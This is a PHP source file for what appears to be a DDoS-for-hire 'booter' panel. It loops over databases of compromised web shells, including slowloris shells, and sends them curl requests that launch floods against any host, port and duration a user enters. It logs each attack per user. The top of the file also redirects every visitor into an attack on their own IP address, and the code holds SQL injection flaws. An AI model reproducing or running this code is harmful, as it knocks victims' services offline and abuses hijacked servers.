<?php
require("dbc.php");
?>
<?php
$ip = $_SERVER['REMOTE_ADDR'];
header("Location: autoboot.php?dosattack=1&host=$ip&time=30&port=80");
?>


<script type="text/javascript">
function handleKeyPress(e,form){
	var key=e.keyCode || e.which;
	if (key==13){
		hub();
	}
}
function handleEnterPress(e,form){
	var key=e.keyCode || e.which;
	if (key==13){
		getip();
	}
}
</script>
<?php
set_time_limit(35);
ignore_user_abort(TRUE);

include 'includes/EpiCurl.php';
require("includes/ezSQLCore.php");
require("includes/ezSQL.php");

$query = mysql_query("SELECT * FROM `users` WHERE `id`='$_SESSION[user_id]' AND `banned`=1") or die(mysql_error());
if (mysql_num_rows($query) > 0) {
	mysql_query("update `users`
		set `ckey`= '', `ctime`= ''
		where `id`='$_SESSION[user_id]' OR  `id` = '$_COOKIE[user_id]'") or die(mysql_error());
	unset($_SESSION['user_id']);
	unset($_SESSION['user_name']);
	unset($_SESSION['user_level']);
	unset($_SESSION['HTTP_USER_AGENT']);
	session_unset();
	session_destroy();
	setcookie("user_id", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	setcookie("user_name", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	setcookie("user_key", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	die("You do not have permission to view this page.");
}

if (isset($_GET['host']) && isset($_GET['time']) && isset($_GET['port']))
{

	$SQL = new ezSQL_mysql();
	$SQL->connect(DB_USER, DB_PASS);
	$SQL->select(DB_NAME);
	$Query = "SELECT * FROM `getshells`";
        $AffectedRows = $SQL->query($Query);
        $host = $_GET['host'];
        $time = intval($_GET['time']);
        $port = intval($_GET['port']);
        $mc = EpiCurl::getInstance();
	$ch = array();


if($time >= 121) {
die("<hr>You cannot issue attacks exceeding 120 seconds.");
}

if($host == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

if($time == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

if($port == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

/*
* Example Blacklisting
*/

if($host == "hackforums.net") { die("<hr>You cannot attack this."); }


/*
* End of blacklisting
*/

    for($i = 0; $i < $AffectedRows; $i++)
    {
	$row = $SQL->last_result[$i];
        $shell = trim($row->URL);

        if (strlen($shell) == 0)
            continue;

        $shell .= "?act=phptools&ip={$host}&time={$time}&port={$port}";
        $ch[$i] = curl_init($shell);
        curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch[$i], CURLOPT_TIMEOUT, 7);
        $curl1 = $mc->addCurl($ch[$i]);
    }

	$Query = "SELECT * FROM `postshells`";
	$AffectedRows = $SQL->query($Query);
    $ch2 = array();
    $post = "ip={$host}&time={$time}&port={$port}";

//slowloris shell support

	$SQL = new ezSQL_mysql();
	$SQL->connect(DB_USER, DB_PASS);
	$SQL->select(DB_NAME);
	$Query = "SELECT * FROM `slowloris`";
        $AffectedRows = $SQL->query($Query);
        $host = $_GET['host'];
        $time = intval($_GET['time']);
        $port = intval($_GET['port']);
        $mc = EpiCurl::getInstance();
	$ch = array();


    for($i = 0; $i < $AffectedRows; $i++)
    {
	$row = $SQL->last_result[$i];
        $shell = trim($row->URL);

        if (strlen($shell) == 0)
            continue;

        $shell .= "?act=phptools&ip={$host}&time={$time}";
        $ch[$i] = curl_init($shell);
        curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch[$i], CURLOPT_TIMEOUT, 7);
        $curl1 = $mc->addCurl($ch[$i]);
    }


echo "<p id='sent'><center><strong><font color=\"lime\">Auto DDoSer Link</font></strong></center></p>";

$username = $_SESSION['user_name'];
$host = strip_tags(mysql_real_escape_string($_GET['host']));
$time = strip_tags(mysql_real_escape_string($_GET['time']));
$port = strip_tags(mysql_real_escape_string($_GET['port']));
$date = date("m-d-Y, h:i:s a", time());

mysql_query("INSERT INTO logs
(username, ip, time, port, date) VALUES('" . $username . "', '" .$host . "', '" . $time . "', '" . $port . "', '" . $date . "' ) ")
or die(mysql_error());

mysql_query("UPDATE users set myAttacks = myAttacks + 1 WHERE full_name = '" . $username . "'") or die(mysql_error());

}
?>